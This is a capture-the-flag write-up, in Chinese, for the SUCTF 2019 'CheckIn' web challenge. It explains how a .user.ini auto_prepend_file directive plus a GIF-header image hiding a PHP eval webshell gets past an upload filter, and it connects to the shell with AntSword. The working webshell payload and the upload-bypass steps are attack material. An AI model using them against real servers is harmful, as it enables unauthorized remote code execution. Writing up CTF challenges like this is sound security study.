---
title: "[SUCTF 2019]CheckIn"
date: 2020-05-28 20:09:22
tags: Web
---

先随便上传一个图片

![](image-20200528200255509.png)

这里是index.php 过滤掉了

先上传一个.user.ini

> .user.ini
>
> 这得从php.ini说起了。php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：PHP_INI_SYSTEM、PHP_INI_PERDIR、PHP_INI_ALL、PHP_INI_USER。
>
> `.user.ini`。它比`.htaccess`用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法。我的nginx服务器全部是fpm/fastcgi，我的IIS php5.3以上的全部用的fastcgi/cgi，我win下的apache上也用的fcgi，可谓很广，不像.htaccess有局限性。
>
> 在此可以查看：http://php.net/manual/zh/ini.list.php 这几种模式有什么区别？看看官方的解释：
>
> ![](image-20200528200448627.png)
>
> 指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：
>
> ```
> auto_prepend_file=01.gif
> ```
>
> 01.gif是要包含的文件。
>
> 所以，我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。

参考链接：https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html

解题

制作一个.user.ini的文件

再使用十六进制 修改文件头以便上传

```
GIF89A?
auto_prepend_file=s.jpg
```

制作图片马   //有些题会过滤掉<?

这里使用

```
GIF89A?
<script language='php'>eval($_POST['a']);</script>
```

蚁剑连接

![](image-20200528200847304.png)